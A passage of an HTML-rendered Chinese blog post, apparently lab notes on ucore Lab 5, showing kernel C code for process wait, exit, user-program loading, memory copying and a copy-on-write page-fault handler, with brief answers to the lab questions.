class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_wait - wait one OR any children to become PROC_ZOMBIE state, and free memory space of kernel stack</span><br><span class="hljs-comment">//         - proc struct of this child.</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> only after do_wait function, all resources of the child proces are free.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pid, <span class="hljs-keyword">int</span> *code_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//例行检查</span><br>        <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)code_store, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">1</span>)) &#123;<br>            <span class="hljs-keyword">return</span> -E_INVAL;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">bool</span> intr_flag, haskid;<br>repeat:<br>    haskid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//不等于零意味着要在hash_list中寻找特定pid的子程序</span><br>        proc = find_proc(pid);<br>        <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//查找任意一个为ZOMBIE的子程序</span><br>        proc = current-&gt;cptr;<br>        <span class="hljs-keyword">for</span> (; proc != <span class="hljs-literal">NULL</span>; proc = proc-&gt;optr) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (haskid) &#123;<span class="hljs-comment">//存在子程序, 但是没有一个是ZOMBIE, 而且当前是父进程在执行, 所以调用switch()来</span><br>        <span class="hljs-comment">//切换到子进程执行, 并且设置一下父进程为SLEEP状态, wait原因是for child</span><br>        current-&gt;state = PROC_SLEEPING;<br>        current-&gt;wait_state = WT_CHILD;<br>        schedule();<br>        <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//怎么调用了do_exit()?????</span><br>            do_exit(-E_KILLED);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> repeat;<span class="hljs-comment">//子进程(应该)执行完了, 重新查找</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_BAD_PROC;<span class="hljs-comment">//没有子程序的话......</span><br><br>found:<br>    <span class="hljs-keyword">if</span> (proc == idleproc || proc == initproc) &#123;<span class="hljs-comment">//不可能是任何进程的子进程</span><br>        panic(<span class="hljs-string">&quot;wait idleproc or initproc.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//如果提供了存放exit_code的变量, 则存入</span><br>        *code_store = proc-&gt;exit_code;<br>    &#125;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//对这种链表的操作要屏蔽中断</span><br>        unhash_proc(proc);<br>        remove_links(proc);<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-comment">//释放子进程占用资源</span><br>    put_kstack(proc);<br>    kfree(proc);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="exit"><a href="#exit" class="headerlink" title="exit():"></a>exit():</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_exit - called by sys_exit</span><br><span class="hljs-comment">//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process</span><br><span class="hljs-comment">//   2. set process&#x27; state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.</span><br><span class="hljs-comment">//   3. call scheduler to switch to other process</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> error_code)</span> </span>&#123;<br>    <span class="hljs-comment">//不能退出的两个内核进程</span><br>    <span class="hljs-keyword">if</span> (current == idleproc) &#123;<br>        panic(<span class="hljs-string">&quot;idleproc exit.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (current == initproc) &#123;<br>        panic(<span class="hljs-string">&quot;initproc exit.\n&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//如果current-&gt;mm不为NULL, 说明为用户进程, 清空一下mm(包括vma链表,页目录表,以及mm自身)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    current-&gt;state = PROC_ZOMBIE;<br>    current-&gt;exit_code = error_code;<br><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-comment">//如果父进程因为WT_CHILD睡眠, 则唤醒父进程</span><br>        proc = current-&gt;parent;<br>        <span class="hljs-keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;<br>            wakeup_proc(proc);<br>        &#125;<br>        <span class="hljs-keyword">while</span> (current-&gt;cptr != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//当前进程有子进程</span><br>            proc = current-&gt;cptr;<br>            current-&gt;cptr = proc-&gt;optr;<br>   <span class="hljs-comment">//以下几行把proc从current的cptr上插入到initproc的cptr等关系指针中</span><br>            proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//把current的子进程的父进程设置为initproc</span><br>                initproc-&gt;cptr-&gt;yptr = proc;<br>            &#125;<br>            proc-&gt;parent = initproc;<br>            initproc-&gt;cptr = proc;<br>            <span class="hljs-comment">//如果initproc因为WT_CHILD睡眠, 则唤醒initproc</span><br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;<br>                    wakeup_proc(initproc);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br>    schedule();<br>    panic(<span class="hljs-string">&quot;do_exit will not return!! %d.\n&quot;</span>, current-&gt;pid);<br></code></pre></div></td></tr></table></figure><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-2"><a href="#练习1-2" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>补充load_icode()的实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//(6) setup trapframe for user environment</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br><span class="hljs-built_in">memset</span>(tf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct trapframe));<span class="hljs-comment">//清空tf</span><br><span class="hljs-comment">/* LAB5:EXERCISE1 YOUR CODE</span><br><span class="hljs-comment"> * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span><br><span class="hljs-comment"> * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span><br><span class="hljs-comment"> *          tf_cs should be USER_CS segment (see memlayout.h)</span><br><span class="hljs-comment"> *          tf_ds=tf_es=tf_ss should be USER_DS segment</span><br><span class="hljs-comment"> *          tf_esp should be the top addr of user stack (USTACKTOP)</span><br><span class="hljs-comment"> *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span><br><span class="hljs-comment"> *          tf_eflags should be set to enable computer to produce Interrupt</span><br><span class="hljs-comment"> */</span><br>tf-&gt;tf_cs = USER_CS;<br><span class="hljs-comment">//答案中好像没有tf_fs?虽然不重要但是不知道为什么不加上</span><br>tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_fs = tf-&gt;tf_ss = USER_DS;<br>tf-&gt;tf_esp = USTACKTOP;<br>tf-&gt;tf_eflags |= FL_IF;<br>tf-&gt;tf_eip= elf-&gt;e_entry;<br>ret = <span class="hljs-number">0</span>;<br></code></pre></div></td></tr></table></figure><blockquote><p>请在实验报告中描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p></blockquote><p>简单</p><h3 id="练习2-2"><a href="#练习2-2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p>do_fork()-&gt;dum_mmap()-&gt;copy_range()的实现</p></blockquote><p>按照page unit来复制内存内容, 这样可以同时更改pte的内容. </p><p>过程概述: 对于vma中的第一个地址start来说, 取出(pde_t *)from中的pte, 用pte2page转换成start地址开始的一个page, 然后用get_pte找到或创建to中start地址对应的pte, 也转换成page(即npage). 然后显而易见的, 我们需要转换page2kva来当做memcpy()的参数来复制整个页的内容, 进一步调用page_insert()来在to中把 虚拟地址start 和 npage 建立映射关系. </p><p>一些细节注释在下面, 整个循环的变量就是不断按照pagesize增加的start虚拟地址.</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* copy_range - copy content of memory (start, end) of one process A to another process B</span><br><span class="hljs-comment"> * @to:    the addr of process B&#x27;s Page Directory</span><br><span class="hljs-comment"> * @from:  the addr of process A&#x27;s Page Directory</span><br><span class="hljs-comment"> * @share: flags to indicate to dup OR share. We just use dup method, so it didn&#x27;t be used.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * CALL GRAPH: copy_mm--&gt;dup_mmap--&gt;copy_range</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">copy_range</span><span class="hljs-params">(<span class="hljs-keyword">pde_t</span> *to, <span class="hljs-keyword">pde_t</span> *from, <span class="hljs-keyword">uintptr_t</span> start, <span class="hljs-keyword">uintptr_t</span> end, <span class="hljs-keyword">bool</span> share)</span> </span>&#123;<br>    assert(start % PGSIZE == <span class="hljs-number">0</span> &amp;&amp; end % PGSIZE == <span class="hljs-number">0</span>);<br>    assert(USER_ACCESS(start, end));<br>    <span class="hljs-comment">// copy content by page unit.</span><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-comment">//call get_pte to find process A&#x27;s pte according to the addr start</span><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(from, start, <span class="hljs-number">0</span>), *nptep;  <span class="hljs-comment">// nptep for new page table entry pointer</span><br>        <span class="hljs-keyword">if</span> (ptep == <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-comment">// this page table does not exit, so skip whole memory that mapped by a page table</span><br>            <span class="hljs-comment">// why would this happen?</span><br>            <span class="hljs-comment">// PTSIZE : bytes mapped by a page directory entry</span><br>            start = ROUNDDOWN(start + PTSIZE, PTSIZE);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">//call get_pte to find process B&#x27;s pte according to the addr start. If pte is NULL, just alloc a PT</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-keyword">if</span> ((nptep = get_pte(to, start, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">return</span> -E_NO_MEM;<br>            &#125;<br>            <span class="hljs-keyword">uint32_t</span> perm = (*ptep &amp; PTE_USER);<br>            <span class="hljs-comment">//get page from ptep</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> pte2page(*ptep);<br>            <span class="hljs-comment">// alloc a page for process B</span><br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">npage</span> =</span> alloc_page();<br>            assert(page != <span class="hljs-literal">NULL</span>);<br>            assert(npage != <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">/* LAB5:EXERCISE2 YOUR CODE</span><br><span class="hljs-comment">             * (1) find src_kvaddr: the kernel virtual address of page</span><br><span class="hljs-comment">             * (2) find dst_kvaddr: the kernel virtual address of npage</span><br><span class="hljs-comment">             * (3) memory copy from src_kvaddr to dst_kvaddr, size is PGSIZE</span><br><span class="hljs-comment">             * (4) build the map of phy addr of  nage with the linear addr start</span><br><span class="hljs-comment">             */</span><br>            <span class="hljs-keyword">uintptr_t</span> src_kvaddr, dst_kvaddr;<br>            src_kvaddr = page2kva(page);<br>            dst_kvaddr = page2kva(npage);<br>            <span class="hljs-built_in">memcpy</span>(dst_kvaddr, src_kvaddr, PGSIZE);<br>            ret = page_insert(to, npage, start, perm);<br>            assert(ret == <span class="hljs-number">0</span>);<br>        &#125;<br>        start += PGSIZE;<br>    &#125; <span class="hljs-keyword">while</span> (start != <span class="hljs-number">0</span> &amp;&amp; start &lt; end);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="练习3-1"><a href="#练习3-1" class="headerlink" title="练习3"></a>练习3</h3><blockquote><p>分析fork/exec/wait/exit 和 系统调用的实现</p></blockquote><p>写在知识点里</p><ul><li>请分析fork/exec/wait/exit在实现中是如何影响进程的执行状态的？<ul><li>fork会修改其子进程的状态为<code>PROC_RUNNABLE</code>，而当前进程状态不变。</li><li>exec不修改当前进程的状态，但会替换内存空间里所有的数据与代码。</li><li>wait会先检测是否存在子进程。如果存在进入<code>PROC_ZONBIE</code>的子进程，则回收该进程并函数返回。但若存在尚处于<code>PROC_RUNNABLE</code>的子进程，则当前进程会进入<code>PROC_SLEEPING</code>状态，并等待子进程唤醒。</li><li>exit会将当前进程状态设置为<code>PROC_ZONBIE</code>，并唤醒父进程，使其处于<code>PROC_RUNNABLE</code>的状态，之后主动让出CPU。</li></ul></li><li>请给出ucore中一个用户态进程的执行状态生命周期图（包括执行状态，执行状态之间的变换关系，以及产生变换的事件或函数调用）。<a href="https://kiprey.github.io/2020/08/uCore-5/#Questions">link</a> </li></ul><pre><code class=" mermaid">stateDiagram-v2[*]--&gt;UNINIT : alloc_procUNINIT--&gt;RUNNABLE : proc_init/wakeup_procRUNNING--&gt;SLEEPING : try_free_pages/do_wait/do_sleepRUNNING--&gt;ZOMBIE : do_exitRUNNABLE--&gt;RUNNING :调度器调度RUNNING--&gt;RUNNABLE :时间片耗尽SLEEPING--&gt;RUNNABLE : wakeup_procZOMBIE--&gt;[*]:资源回收</code></pre><h3 id="Big-Challenge-Dirty-COW"><a href="#Big-Challenge-Dirty-COW" class="headerlink" title="Big Challenge: Dirty COW"></a>Big Challenge: Dirty COW</h3><blockquote><p><strong>实现 Copy on Write （COW）机制</strong> </p><p>同时，由于COW实现比较复杂，容易引入bug，请参考 <a href="https://dirtycow.ninja/">Dirty COW (CVE-2016-5195)</a> 看看能否在ucore的COW实现中模拟这个错误和解决方案。需要有解释。</p><p>这是一个big challenge.</p></blockquote><h4 id="1-思路"><a href="#1-思路" class="headerlink" title="1. 思路"></a>1. 思路</h4><p><strong>写时复制</strong>（<strong>Copy-on-write</strong>，简称<strong>COW</strong>）是一种计算机程序设计领域的优化策略。其核心思想是，如果有多个调用者（callers）同时请求相同资源（如内存或磁盘上的数据存储），他们会使用指针指向相同的资源，直到<strong>某个调用者</strong>试图修改资源的内容时，系统才会真正复制一份专用副本（private copy）给该调用者，而其他调用者所见到的最初的资源仍然保持不变。</p><p>具体到ucore而言, 当一个用户父进程创建自己的子进程时，缺页处理例程会把父子进程的页表项改为<strong>只读</strong>，子进程可共享父进程占用的用户内存空间中的页面（这就是一个共享的资源）。当其中任何一个进程修改此用户内存空间中的某页面时，ucore会通过page fault异常获知该操作，并完成拷贝内存页面，使得两个进程都有各自的内存页面。这样一个进程所做的修改不会被另外一个进程可见了。</p><h4 id="2-具体实现"><a href="#2-具体实现" class="headerlink" title="2. 具体实现"></a>2. 具体实现</h4><ul><li><p>当进行内存访问时，CPU会根据PTE上的读写位<code>PTE_P</code>、<code>PTE_W</code>来确定当前内存操作是否允许，如果不允许，则缺页中断。我们可以在<code>copy_range</code>函数中，将父进程中所有PTE中的<code>PTE_W</code>置为0，这样便可以将父进程中所有空间都设置为只读。然后使子进程的PTE全部指向父进程中PTE存放的物理地址，这样便可以达到内存共享的目的。</p><blockquote><p>为什么要设置父进程所有空间为只读呢，因为在之后的内存操作中，如果对这些空间进行写操作的话，程序就会触发缺页中断，那么CPU就可以在缺页中断程序中复制该内存，也就是写时复制。</p></blockquote><blockquote><p>为什么在copy_range函数中实现内存共享呢？因为我们可以在该函数中对其传入的<code>share</code>参数进行处理。</p></blockquote><p>最终实现把拷贝内存的部分换成复制一下pte的内容就可以了:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">...         <span class="hljs-keyword">if</span>(share)<br>            &#123;<br>                cprintf(<span class="hljs-string">&quot;Sharing the page 0x%x\n&quot;</span>, page2kva(page));<br>                <span class="hljs-comment">// 物理页面共享，并设置两个PTE上的标志位为只读</span><br>                page_insert(from, page, start, perm &amp; ~PTE_W);<br>                ret = page_insert(to, page, start, perm &amp; ~PTE_W);<br>            &#125;<br>            <span class="hljs-comment">// 完整拷贝内存</span><br>            <span class="hljs-keyword">else</span><br>            &#123;<br>...<br>            &#125; ...<br></code></pre></div></td></tr></table></figure></li><li><p>当某个进程想写入一个共享内存时，由于PTE上的<code>PTE_W</code>为0，所以会触发缺页中断处理程序。此时进程需要在缺页中断处理程序中复制该页内存，并设置该页内存所对应的<code>PTE_W</code>为1。</p><blockquote><p>需要注意的是，在执行缺页中断处理程序中的内存复制操作前，需要先检查该物理页的引用次数。如果该引用次数已经为1了，则表明此时的物理页只有当前进程所使用，故可以直接设置该页内存所对应的<code>PTE_W</code>为1即可，不需要进行内存复制。</p></blockquote><p>最终实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-comment">// ........</span><br>   <span class="hljs-comment">// 查找当前虚拟地址所对应的页表项</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个页表项所对应的物理页不存在，则</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 分配一块物理页，并设置页表项</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//不为空说明需要swap或者COW</span><br>        struct Page *page=<span class="hljs-literal">NULL</span>;<br>        <span class="hljs-comment">// 如果当前页错误的原因是写入了只读页面</span><br>        <span class="hljs-keyword">if</span> (*ptep &amp; PTE_P) &#123;<br>            <span class="hljs-comment">// 写时复制：复制一块内存给当前进程</span><br>            cprintf(<span class="hljs-string">&quot;\n\nCOW: ptep 0x%x, pte 0x%x\n&quot;</span>,ptep, *ptep);<br>            <span class="hljs-comment">// 原先所使用的只读物理页</span><br>            page = pte2page(*ptep);<br>            <span class="hljs-comment">// 如果该物理页面被多个进程引用</span><br>            <span class="hljs-keyword">if</span>(page_ref(page) &gt; <span class="hljs-number">1</span>)<br>            &#123;<br>                <span class="hljs-comment">// 释放当前PTE的引用并分配一个新物理页</span><br>                <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span>* <span class="hljs-title">newPage</span> =</span> pgdir_alloc_page(mm-&gt;pgdir, addr, perm);<br>                <span class="hljs-keyword">void</span> * kva_src = page2kva(page);<br>                <span class="hljs-keyword">void</span> * kva_dst = page2kva(newPage);<br>                <span class="hljs-comment">// 拷贝数据</span><br>                <span class="hljs-built_in">memcpy</span>(kva_dst, kva_src, PGSIZE);<br>            &#125;<br>            <span class="hljs-comment">// 如果该物理页面只被当前进程所引用,即page_ref等1</span><br>            <span class="hljs-keyword">else</span><br>                <span class="hljs-comment">// 则可以直接执行page_insert，保留当前物理页并重设其PTE权限。</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">// 如果swap已经初始化完成</span><br>            <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>                <span class="hljs-comment">// 将目标数据加载到某块新的物理页中。</span><br>                <span class="hljs-comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span><br>                <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                    cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                    <span class="hljs-keyword">goto</span> failed;<br>                &#125;<br>                <span class="hljs-comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span><br>                page_insert(mm-&gt;pgdir, page, addr, perm);<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span><br>        swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>        page-&gt;pra_vaddr = addr;<br>   &#125;<br>   ret = <span 